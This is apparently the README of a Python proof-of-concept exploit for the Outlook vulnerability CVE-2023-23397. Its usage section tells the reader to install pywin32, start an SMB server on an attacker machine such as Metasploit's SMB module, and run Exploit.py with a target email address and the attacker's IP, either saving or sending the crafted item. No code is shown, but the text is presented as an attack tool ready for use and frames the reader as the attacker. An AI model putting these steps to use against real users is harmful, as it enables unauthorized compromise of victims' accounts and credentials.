# CVE-2023-23397 (Outlook Privilege Escalation)
Proof of Concept for CVE-2023-23397 in Python

Quick and easy "proof of concept" in Python for the Outlook CVE that affects Microsoft Office/365 products. 

# Usage
1. Install pywin by running `pip install pywin32`
2. Start a SMB server on the attacker machine, such as Metasploit's SMB module
3. Run `python Exploit.py <save_or_send> <target email> <attacker_ip>` passing the command (save or send), the target email address and the IP of the attacker's machine
